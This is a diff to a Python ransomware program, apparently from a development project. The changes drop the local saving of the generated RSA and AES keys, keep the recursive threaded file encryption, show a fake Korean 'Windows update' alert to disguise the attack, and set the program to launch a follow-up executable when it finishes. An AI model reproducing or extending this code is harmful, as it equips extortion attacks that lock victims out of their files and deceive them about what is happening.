@@ -13,16 +13,12 @@ from PIL import Image, ImageDraw, ImageFont
 from tkinter import Label, Entry
 import subprocess
 
-fileName='./Client.py'
-afterFileName='./Client_after_enc.py'
+fileName='./Client.exe'#'./Client.py'
+afterFileName='Client_after_enc.exe'#'./Client_after_enc.exe'
 
-PRIVATE_KEY_RSA_FILENAME=f"KEY_FILE"
 PRIVATE_KEY_RSA=0
 PUBLIC_KEY_RSA=0
-
-PRIVATE_KEY_AES_FILENAME=f"KEY_FILE2"
 PRIVATE_KEY_AES=0
-
 PUBLIC_SERVER_RSA_KEY=PublicKey(b'gmv]R[\x83z\xf9R\xd4?\xbd\x0c\xfc\x0f\xdf\n\xf6\xaa\x9f@\xf8\xb2\xfb\x05\x95\xbcO\xc3wE')
 
 AES_BOX=0
@@ -41,26 +37,12 @@ PathList_DEBUG=[]
 
 def makeRSAKey():
     global PRIVATE_KEY_RSA, PUBLIC_KEY_RSA
-    if os.path.isfile(PRIVATE_KEY_RSA_FILENAME):
-        with open(PRIVATE_KEY_RSA_FILENAME, 'rb') as File:
-            byteCode=File.read()
-        PRIVATE_KEY_RSA=PrivateKey(byteCode)
-        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
-    else:
-        PRIVATE_KEY_RSA=PrivateKey.generate()
-        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
-        with open(PRIVATE_KEY_RSA_FILENAME, 'wb') as File:
-            File.write(PRIVATE_KEY_RSA._private_key)
+    PRIVATE_KEY_RSA=PrivateKey.generate()
+    PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
 
 def makeAESKey():
     global PRIVATE_KEY_AES
-    if os.path.isfile(PRIVATE_KEY_AES_FILENAME):
-        with open(PRIVATE_KEY_AES_FILENAME, 'rb') as File:
-            PRIVATE_KEY_AES=File.read()
-    else:
-        PRIVATE_KEY_AES=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
-        with open(PRIVATE_KEY_AES_FILENAME, 'wb') as File:
-            File.write(PRIVATE_KEY_AES)
+    PRIVATE_KEY_AES=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
 
 def encryptAES():
     global AES_BOX
@@ -111,7 +93,7 @@ class Encryptor:
                         self.encEach(file)
                 
         except Exception as e:
-            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
+            print(f"[DEBUG] Error on Encrypt.encryptFile(): {e}")
 
 def setEncryptModule():
     global EncryptModule
@@ -126,7 +108,7 @@ def listUpTargetDir():
     #        PathList.append(drive)
     #PathList.remove("c:\\")
     #print(f"[DEBUG] PathList: {PathList}")
-    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\molly"]
+    PathList_DEBUG=["E:\\github\\-ransomware3\\최지웅\\test"]
 
 def recursiveEncrypt(basepath):
     global ThreadPool
@@ -153,7 +135,7 @@ def fakeAdmin():
 def fakeAlert():
     WINDOW=tkinter.Tk()
     WINDOW.withdraw()
-    messagebox.showerror("Windows 업데이트 작업 중...", "컴퓨터를 끄지 마십시오")
+    messagebox.showerror("Windows 업데이트 진행 중...", "컴퓨터를 끄지 마십시오")
             
 if __name__=='__main__':
     makeRSAKey()
@@ -167,7 +149,6 @@ if __name__=='__main__':
 
     if(IsAdmin==True):
         task_thread = threading.Thread(target=fakeAlert)
-        start=time.time()
         for drive in PathList_DEBUG:
             start=time.time()
             recursiveEncrypt(drive)
@@ -175,10 +156,10 @@ if __name__=='__main__':
             while (len(ThreadPool)!=0):
                 th=ThreadPool.pop()
                 th.join()
-        end=time.time()
-        print(end-start)
     else:
         fakeAdmin()
-    print("완료")
-    #os.system(afterFileName)
-    #os.remove(fileName)
+    print("Windows 업데이트가 완료되었습니다.")
+    
+    #os.system("del /f "+fileName)
+    os.system(afterFileName)
+    sys.exit()
